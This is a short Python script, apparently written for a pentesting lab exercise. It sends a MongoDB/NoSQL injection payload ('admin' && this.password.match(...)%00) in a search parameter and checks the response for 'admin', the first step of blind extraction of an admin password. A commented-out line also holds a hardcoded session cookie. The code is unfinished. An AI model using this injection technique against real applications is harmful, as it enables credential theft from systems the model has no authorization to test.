from bs4 import BeautifulSoup
import requests, re, string

s = requests.session()



password=""
target_url="ptc-326d0964-fdd096bb.libcurl.so"
resp = s.get("http://{}/?search=admin'%20%26%26%20this.password.match(/{}/)%00".format(target_url,password))

#cookie_obj=requests.cookies.create_cookie(domain="http://ptc-326d0964-fdd096bb.libcurl.so",name="rack.session",value="BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiRWI0ZWJkYTMwMzUzYmM2ZGY0YmNj%0AYzdhMzlhOTc4NGE4ZWIxMjhhZDlmNmRhZDIwZmJiOWUyNWQ0YzhmZDU1ODEG%0AOwBGSSIJY3NyZgY7AEZJIiU5YmU0MDVmNDk2YWUyMDAyNzAwN2ZiZGI4MzE1%0AZmRkNgY7AEZJIg10cmFja2luZwY7AEZ7B0kiFEhUVFBfVVNFUl9BR0VOVAY7%0AAFRJIi1hMWYzODY1Yjk4MGRiYjBiNDdkYTAwYzJlZGEwNzFkZWQ4ODE4NzBi%0ABjsARkkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsAVEkiLWRkMDY1ZWQyNjNj%0ANjdkNzk5Zjk0M2FiNmMzOWI1NWM1ZTAwOGNiYjUGOwBG%0A--358d15417fac70c6fdbde3955cd17c3134a694a8")
#attack_string=("admin' %26%26 this.password.match(/^{}.%/)%00").format(password)
#s.cookies.set_cookie(cookie_obj)


#1614

parsed_html = BeautifulSoup(resp.text, "html.parser")

def getstring():
	parsed_html = BeautifulSoup(resp.text, "html.parser")
	find = str(parsed_html.find('p'))
	return (find)
find=getstring()
print(find)
find = re.search("admin",find)
print(find)
if find:
	print("found")
else:
	print("not found :(")

#response = s.post(target_url)
